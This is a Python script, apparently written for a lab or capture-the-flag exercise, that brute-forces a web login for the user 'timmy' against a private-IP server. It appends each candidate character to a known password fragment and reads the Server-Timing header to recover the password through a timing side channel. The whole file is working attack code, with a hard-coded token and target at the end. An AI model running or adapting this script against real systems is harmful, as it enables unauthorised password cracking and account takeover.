import requests

# Function to perform a brute force password cracking attempt
def brute_force_password_crack(base_url, token, username, known_password_fragment):
    # Parameters for HTTP requests
    params = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate'
    }
    
    # Headers for HTTP requests
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    # URL endpoints
    url1 = f'{base_url}/token'
    url2 = f'{base_url}/login'
    
    # Data for the first request to get a token (if necessary)
    data1 = {"token": token}
    
    # Cookie data (assuming token is to be sent as a cookie)
    cookie = {'hacker_token': token}
    
    # Optionally make an initial request to get a token (or any other setup required)
    response1 = requests.post(url=url1, params=params, data=data1, headers=headers)
    
    # String of characters to test in the password
    charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()-_=+[]\{}|;:",./<>?'
    
    # Initial known fragment of the password
    partial_password = known_password_fragment
    
    # Iterate through the character set and append each character to the known password fragment,
    # making a request each time to check the response.
    for char in charset:
        # Data for the request to attempt a login
        data2 = {"username": username, "password": partial_password + char}
        
        # Make the request to attempt a login
        response2 = requests.post(url=url2, params=params, data=data2, headers=headers, cookies=cookie)
        
        # Optionally print the character and the Server-Timing header from the response
        print(char, response2.headers.get('Server-Timing', 'No Server-Timing header found'))
    


# Call the function with necessary arguments
brute_force_password_crack('http://192.168.1.77:5003', '49-Z0w4dXU2XGTs7hJ_9WshLA-49', 'timmy', 'G8FWWfWdNL54')
